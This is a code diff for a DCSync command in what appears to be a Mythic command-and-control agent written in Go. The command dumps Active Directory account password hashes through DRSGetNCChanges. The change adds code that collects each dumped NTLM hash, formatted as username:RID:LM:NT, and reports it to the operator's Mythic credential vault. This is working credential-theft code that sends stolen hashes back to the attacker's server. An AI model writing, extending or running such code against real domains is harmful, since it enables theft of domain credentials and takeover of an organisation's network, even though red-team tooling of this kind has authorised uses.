@@ -248,6 +248,7 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	sb.WriteString(strings.Repeat("-", 60) + "\n")
 
 	successCount := 0
+	var creds []structs.MythicCredential
 
 	for i, item := range items {
 		if item.Status != 0 {
@@ -303,16 +304,31 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 				nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
 			}
 			sb.WriteString(fmt.Sprintf("    Hash:   %s:%d:%s:%s:::\n", result.Username, result.RID, lm, nt))
+
+			// Report NTLM hash to Mythic credential vault
+			if result.NTHash != "" {
+				creds = append(creds, structs.MythicCredential{
+					CredentialType: "hash",
+					Realm:          args.Domain,
+					Account:        result.Username,
+					Credential:     fmt.Sprintf("%s:%d:%s:%s:::", result.Username, result.RID, lm, nt),
+					Comment:        "dcsync (DRSGetNCChanges)",
+				})
+			}
 		}
 	}
 
 	sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped successfully\n", successCount, len(targets)))
 
-	return structs.CommandResult{
+	cmdResult := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		cmdResult.Credentials = &creds
+	}
+	return cmdResult
 }
 
 func dcsyncParseReply(cli drsuapi.DrsuapiClient, nc *drsuapi.GetNCChangesResponse, targetName string) *dcsyncResult {
